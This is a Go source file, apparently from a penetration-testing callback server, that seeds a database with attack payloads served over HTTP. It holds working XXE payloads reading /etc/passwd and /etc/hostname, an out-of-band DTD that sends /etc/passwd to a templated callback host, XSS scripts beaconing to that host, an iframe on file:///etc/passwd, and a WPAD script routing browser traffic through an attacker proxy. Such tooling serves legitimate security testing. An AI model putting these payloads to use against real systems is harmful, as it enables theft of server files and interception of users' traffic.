package httpx

import (
	"embed"
	"fmt"
	"github.com/adrg/frontmatter"
	"github.com/defektive/xodbox/pkg/app/model"
	"gorm.io/gorm"
	"io/fs"
)

const InternalFnInspect = "inspect"

//go:embed seeds
var embeddedFS embed.FS

type matter struct {
	Name string   `yaml:"name"`
	Tags []string `yaml:"tags"`
}

func getAllFilenames(efs *embed.FS) (files []string, err error) {
	if err := fs.WalkDir(efs, ".", func(path string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			return nil
		}

		files = append(files, path)

		return nil
	}); err != nil {
		return nil, err
	}

	return files, nil
}

func getSeedsFromFiles() {

	embeddedFiles, err := getAllFilenames(&embeddedFS)
	if err != nil {
		panic(err)
	}

	for _, embeddedFile := range embeddedFiles {
		f, err := embeddedFS.Open(embeddedFile)
		if err != nil {
			panic(err)
		}

		var seedData = matter{}
		rest, err := frontmatter.Parse(f, &seedData)
		if err != nil {
			panic(err)
		}

		fmt.Println(rest)

	}

}

func Seed(dbh *gorm.DB) {

	getSeedsFromFiles()
	return

	seedFns := []func(db *gorm.DB) *gorm.DB{
		seedBreakfastBot,
		seedInspect,
		seedHello,
		seedWPAD,
		seedXXEEtcHostname,
		seedXXERemoteRef,
		seedEvilDTD,
		seedXSSJS,
		seedHTMLIFrameEtcPasswd,
		seedSVGXXE,
		seedSVGXSS,
	}

	for _, fn := range seedFns {
		tx := fn(dbh)
		if tx.Error != nil {
			lg().Error("Error seeding database payload", "err", tx.Error)
		}
	}
}

func seedBreakfastBot(dbh *gorm.DB) *gorm.DB {
	h := newDefaultPayload("^/", -1000)
	h.Data = PayloadData{
		Headers: map[string]string{
			"Server": "BreakfastBot/1.0.0",
		},
	}

	return dbh.Create(h)
}

func seedInspect(dbh *gorm.DB) *gorm.DB {
	h := newDefaultPayload("/inspect", -500)
	return dbh.Create(h)
}

func seedHello(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload("/hello$", 1, "application/json", []byte(`{"data":"hello world"}`))
	return dbh.Create(h)
}

const WPAD_SCRIPT = "function FindProxyForURL(url, host){if ((host == \"localhost\") || shExpMatch(host, \"localhost.*\") ||(host == \"127.0.0.1\") || isPlainHostName(host)) return \"DIRECT\"; if (dnsDomainIs(host, \"{{.ProxySrvRegex}}\")||shExpMatch(host, \"(*.{{.ProxySrvRegex}}|{{.ProxySrvRegex}})\")) return \"DIRECT\"; return 'PROXY {{.ProxySrv}}:3128; PROXY {{.ProxySrv}}:3141; DIRECT';}"

func seedWPAD(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/wpad\.dat`, 1, "text/javascript", []byte(WPAD_SCRIPT))
	return dbh.Create(h)
}

func seedXXEEtcHostname(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/sh$`, 1, "text/xml", []byte(`<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>`))
	return dbh.Create(h)
}

func seedXXERemoteRef(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/dt$`, 1, "text/xml", []byte(`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .AlertPattern }}/xxe-test" >]><foo>&xxe;</foo>`))
	return dbh.Create(h)
}

func seedEvilDTD(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/evil\.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
	return dbh.Create(h)
}
func seedXSSJS(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/js$`, 1, "text/javascript", []byte(`var s = document.createElement("img");document.body.appendChild(s); s.src="//{{ .Host }}/{{.AlertPattern}}/s";`))
	return dbh.Create(h)
}
func seedHTMLIFrameEtcPasswd(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/ht$`, 1, "text/html", []byte(`<html><body><img src="{{.AlertPattern}}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`))
	return dbh.Create(h)
}

func seedSVGXXE(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/sv$`, 1, "image/svg+xml", []byte(`<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`))
	return dbh.Create(h)
}

func seedSVGXSS(dbh *gorm.DB) *gorm.DB {
	h := newDefaultSimplePayload(`/svgxss$`, 1, "image/svg+xml", []byte(`<?xml version="1.0" standalone="yes"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script type="text/javascript">alert('XSS');</script></svg>`))
	return dbh.Create(h)
}

func newDefaultPayload(pattern string, sortOrder int) *HTTPPayload {
	n := NewHTTPPayload()
	n.Project = model.DefaultProject()

	n.Pattern = pattern
	if pattern == "/inspect" {
		n.InternalFunc = InternalFnInspect
	}
	n.SortOrder = sortOrder

	return n
}

func newDefaultSimplePayload(pattern string, sortOrder int, contentType string, body []byte) *HTTPPayload {
	n := newDefaultPayload(pattern, sortOrder)
	n.Data = PayloadData{}

	if contentType != "" {
		n.Data.Headers = map[string]string{
			"Content-Type": contentType,
		}
	}

	if len(body) > 0 {
		n.Data.Body = string(body)
	}

	return n
}
